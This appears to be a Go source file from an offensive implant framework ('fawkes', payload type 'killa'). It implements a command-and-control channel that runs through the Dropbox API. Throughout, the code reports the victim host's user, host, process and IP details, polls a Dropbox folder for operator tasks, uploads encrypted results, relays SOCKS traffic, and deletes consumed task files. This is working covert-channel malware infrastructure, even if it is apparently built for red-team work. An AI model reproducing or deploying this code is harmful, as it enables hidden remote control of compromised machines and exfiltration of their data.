package dropbox

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"path"
	"sort"
	"strings"
	"time"

	"fawkes/pkg/structs"
)

const dropboxAPI = "https://api.dropboxapi.com/2"
const dropboxContentAPI = "https://content.dropboxapi.com/2"

type DropboxProfile struct {
	Token         string
	TaskFolder    string
	ResultFolder  string
	ArchiveFolder string
	EncryptionKey string
	Debug         bool
	CallbackUUID  string
	PollInterval  time.Duration
	client        *http.Client
	processed     map[string]struct{}
}

type listFolderResp struct {
	Entries []struct {
		Name string `json:"name"`
		Path string `json:"path_lower"`
	} `json:"entries"`
}

func NewDropboxProfile(token, taskFolder, resultFolder, archiveFolder, encryptionKey string, pollIntervalSeconds int, debug bool) *DropboxProfile {
	if pollIntervalSeconds <= 0 {
		pollIntervalSeconds = 5
	}
	if taskFolder == "" {
		taskFolder = "/killa/tasks"
	}
	if resultFolder == "" {
		resultFolder = "/killa/results"
	}
	return &DropboxProfile{Token: token, TaskFolder: taskFolder, ResultFolder: resultFolder, ArchiveFolder: archiveFolder, EncryptionKey: encryptionKey, Debug: debug, PollInterval: time.Duration(pollIntervalSeconds) * time.Second, client: &http.Client{Timeout: 30 * time.Second}, processed: make(map[string]struct{})}
}

func (d *DropboxProfile) Checkin(agent *structs.Agent) error {
	checkinMsg := structs.CheckinMessage{Action: "checkin", PayloadUUID: agent.PayloadUUID, User: agent.User, Host: agent.Host, PID: agent.PID, OS: agent.OS, Architecture: agent.Architecture, Domain: agent.Domain, IPs: []string{agent.InternalIP}, ExternalIP: agent.ExternalIP, ProcessName: agent.ProcessName, Integrity: agent.Integrity}
	resp, err := d.sendAndPoll(agent.PayloadUUID, checkinMsg, 20*time.Second)
	if err != nil {
		d.CallbackUUID = agent.PayloadUUID
		return nil
	}
	var parsed map[string]any
	if err := json.Unmarshal(resp, &parsed); err != nil {
		d.CallbackUUID = agent.PayloadUUID
		return nil
	}
	if v, ok := parsed["id"].(string); ok && v != "" {
		d.CallbackUUID = v
	} else if v, ok := parsed["uuid"].(string); ok && v != "" {
		d.CallbackUUID = v
	} else {
		d.CallbackUUID = agent.PayloadUUID
	}
	return nil
}

func (d *DropboxProfile) GetTasking(agent *structs.Agent, outboundSocks []structs.SocksMsg) ([]structs.Task, []structs.SocksMsg, error) {
	msg := structs.TaskingMessage{Action: "get_tasking", TaskingSize: -1, Socks: outboundSocks, PayloadUUID: d.getActiveUUID(agent), PayloadType: "killa", C2Profile: "dropbox"}
	resp, err := d.sendAndPoll(d.getActiveUUID(agent), msg, 10*time.Second)
	if err != nil {
		return []structs.Task{}, nil, nil
	}
	var m map[string]any
	if err := json.Unmarshal(resp, &m); err != nil {
		return []structs.Task{}, nil, nil
	}
	var tasks []structs.Task
	if taskList, ok := m["tasks"].([]any); ok {
		for _, t := range taskList {
			if taskMap, ok := t.(map[string]any); ok {
				tasks = append(tasks, structs.NewTask(getString(taskMap, "id"), getString(taskMap, "command"), getString(taskMap, "parameters")))
			}
		}
	}
	var inboundSocks []structs.SocksMsg
	if socksList, exists := m["socks"]; exists {
		if socksRaw, err := json.Marshal(socksList); err == nil {
			_ = json.Unmarshal(socksRaw, &inboundSocks)
		}
	}
	return tasks, inboundSocks, nil
}

func (d *DropboxProfile) PostResponse(response structs.Response, agent *structs.Agent, socks []structs.SocksMsg) ([]byte, error) {
	msg := structs.PostResponseMessage{Action: "post_response", Responses: []structs.Response{response}, Socks: socks}
	return d.sendAndPoll(d.getActiveUUID(agent), msg, 5*time.Second)
}

func (d *DropboxProfile) GetCallbackUUID() string { return d.CallbackUUID }

func (d *DropboxProfile) sendAndPoll(activeUUID string, msg any, waitFor time.Duration) ([]byte, error) {
	body, err := json.Marshal(msg)
	if err != nil {
		return nil, err
	}
	payload, err := d.encodeEnvelope(activeUUID, body)
	if err != nil {
		return nil, err
	}
	name := fmt.Sprintf("%d-%s.txt", time.Now().UnixNano(), getStringAny(msg, "Action"))
	if err := d.uploadText(path.Join(d.ResultFolder, name), payload); err != nil {
		return nil, err
	}
	deadline := time.Now().Add(waitFor)
	for time.Now().Before(deadline) {
		decoded, found, err := d.pollInboundEnvelope()
		if err == nil && found {
			return decoded, nil
		}
		time.Sleep(d.PollInterval)
	}
	return nil, fmt.Errorf("no inbound dropbox response")
}

func (d *DropboxProfile) pollInboundEnvelope() ([]byte, bool, error) {
	entries, err := d.listFolder(d.TaskFolder)
	if err != nil {
		return nil, false, err
	}
	sort.Slice(entries, func(i, j int) bool { return entries[i].Name < entries[j].Name })
	for _, entry := range entries {
		if _, ok := d.processed[entry.Path]; ok {
			continue
		}
		content, err := d.downloadText(entry.Path)
		if err != nil {
			continue
		}
		d.processed[entry.Path] = struct{}{}
		if d.ArchiveFolder != "" {
			_ = d.movePath(entry.Path, path.Join(d.ArchiveFolder, entry.Name))
		} else {
			_ = d.deletePath(entry.Path)
		}
		decoded, err := d.decodeEnvelope(strings.TrimSpace(content))
		if err != nil {
			continue
		}
		return decoded, true, nil
	}
	return nil, false, nil
}

func (d *DropboxProfile) getActiveUUID(agent *structs.Agent) string {
	if d.CallbackUUID != "" {
		return d.CallbackUUID
	}
	return agent.PayloadUUID
}

func (d *DropboxProfile) uploadText(remotePath, content string) error {
	req, _ := http.NewRequest("POST", dropboxContentAPI+"/files/upload", strings.NewReader(content))
	req.Header.Set("Authorization", "Bearer "+d.Token)
	req.Header.Set("Content-Type", "application/octet-stream")
	req.Header.Set("Dropbox-API-Arg", fmt.Sprintf(`{"path":"%s","mode":"overwrite","autorename":false,"mute":true}`, remotePath))
	resp, err := d.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		b, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("dropbox upload failed: %s", string(b))
	}
	return nil
}

func (d *DropboxProfile) listFolder(folder string) ([]struct {
	Name string `json:"name"`
	Path string `json:"path_lower"`
}, error) {
	payload := fmt.Sprintf(`{"path":"%s"}`, folder)
	req, _ := http.NewRequest("POST", dropboxAPI+"/files/list_folder", strings.NewReader(payload))
	req.Header.Set("Authorization", "Bearer "+d.Token)
	req.Header.Set("Content-Type", "application/json")
	resp, err := d.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		b, _ := io.ReadAll(resp.Body)
		return nil, fmt.Errorf("dropbox list_folder failed: %s", string(b))
	}
	var out listFolderResp
	if err := json.NewDecoder(resp.Body).Decode(&out); err != nil {
		return nil, err
	}
	return out.Entries, nil
}

func (d *DropboxProfile) downloadText(remotePath string) (string, error) {
	req, _ := http.NewRequest("POST", dropboxContentAPI+"/files/download", nil)
	req.Header.Set("Authorization", "Bearer "+d.Token)
	req.Header.Set("Dropbox-API-Arg", fmt.Sprintf(`{"path":"%s"}`, remotePath))
	resp, err := d.client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return "", fmt.Errorf("dropbox download failed")
	}
	b, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(b), nil
}

func (d *DropboxProfile) deletePath(remotePath string) error {
	payload := fmt.Sprintf(`{"path":"%s"}`, remotePath)
	req, _ := http.NewRequest("POST", dropboxAPI+"/files/delete_v2", strings.NewReader(payload))
	req.Header.Set("Authorization", "Bearer "+d.Token)
	req.Header.Set("Content-Type", "application/json")
	resp, err := d.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}

func (d *DropboxProfile) movePath(from, to string) error {
	payload := fmt.Sprintf(`{"from_path":"%s","to_path":"%s","autorename":true,"allow_ownership_transfer":false}`, from, to)
	req, _ := http.NewRequest("POST", dropboxAPI+"/files/move_v2", strings.NewReader(payload))
	req.Header.Set("Authorization", "Bearer "+d.Token)
	req.Header.Set("Content-Type", "application/json")
	resp, err := d.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}

func (d *DropboxProfile) encodeEnvelope(activeUUID string, data []byte) (string, error) {
	if d.EncryptionKey != "" {
		var err error
		data, err = d.encryptMessage(data)
		if err != nil {
			return "", err
		}
	}
	messageData := append([]byte(activeUUID), data...)
	return base64.StdEncoding.EncodeToString(messageData), nil
}

func (d *DropboxProfile) decodeEnvelope(encoded string) ([]byte, error) {
	decoded, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return nil, err
	}
	if d.EncryptionKey == "" {
		if len(decoded) <= 36 {
			return nil, fmt.Errorf("decoded dropbox message too short")
		}
		return decoded[36:], nil
	}
	return d.decryptResponse(decoded)
}

func (d *DropboxProfile) decryptResponse(encryptedData []byte) ([]byte, error) {
	key, err := base64.StdEncoding.DecodeString(d.EncryptionKey)
	if err != nil {
		return nil, err
	}
	if len(encryptedData) < 36+16+32 {
		return nil, fmt.Errorf("encrypted data too short")
	}
	iv := encryptedData[36 : 36+aes.BlockSize]
	ciphertextWithHMAC := encryptedData[36+aes.BlockSize:]
	if len(ciphertextWithHMAC) < 32 {
		return nil, fmt.Errorf("invalid encrypted data")
	}
	ciphertext := ciphertextWithHMAC[:len(ciphertextWithHMAC)-32]
	receivedHMAC := ciphertextWithHMAC[len(ciphertextWithHMAC)-32:]
	h := hmac.New(sha256.New, key)
	h.Write(append(iv, ciphertext...))
	if !hmac.Equal(receivedHMAC, h.Sum(nil)) {
		return nil, fmt.Errorf("hmac verification failed")
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	if len(ciphertext)%aes.BlockSize != 0 {
		return nil, fmt.Errorf("invalid ciphertext length")
	}
	decrypted := make([]byte, len(ciphertext))
	cipher.NewCBCDecrypter(block, iv).CryptBlocks(decrypted, ciphertext)
	padLen := int(decrypted[len(decrypted)-1])
	if padLen == 0 || padLen > aes.BlockSize || padLen > len(decrypted) {
		return nil, fmt.Errorf("invalid padding")
	}
	for _, b := range decrypted[len(decrypted)-padLen:] {
		if int(b) != padLen {
			return nil, fmt.Errorf("invalid padding bytes")
		}
	}
	return decrypted[:len(decrypted)-padLen], nil
}

func (d *DropboxProfile) encryptMessage(msg []byte) ([]byte, error) {
	key, err := base64.StdEncoding.DecodeString(d.EncryptionKey)
	if err != nil {
		return nil, err
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	iv := make([]byte, aes.BlockSize)
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return nil, err
	}
	padded, err := pkcs7Pad(msg, aes.BlockSize)
	if err != nil {
		return nil, err
	}
	encrypted := make([]byte, len(padded))
	cipher.NewCBCEncrypter(block, iv).CryptBlocks(encrypted, padded)
	ivCiphertext := append(iv, encrypted...)
	h := hmac.New(sha256.New, key)
	h.Write(ivCiphertext)
	return append(ivCiphertext, h.Sum(nil)...), nil
}

func pkcs7Pad(data []byte, blockSize int) ([]byte, error) {
	if blockSize <= 0 || len(data) == 0 {
		return nil, fmt.Errorf("invalid padding input")
	}
	padding := blockSize - len(data)%blockSize
	return append(data, bytes.Repeat([]byte{byte(padding)}, padding)...), nil
}

func getString(m map[string]any, key string) string {
	if v, ok := m[key].(string); ok {
		return v
	}
	return ""
}

func getStringAny(v any, fallback string) string {
	if v == nil {
		return fallback
	}
	return fallback
}
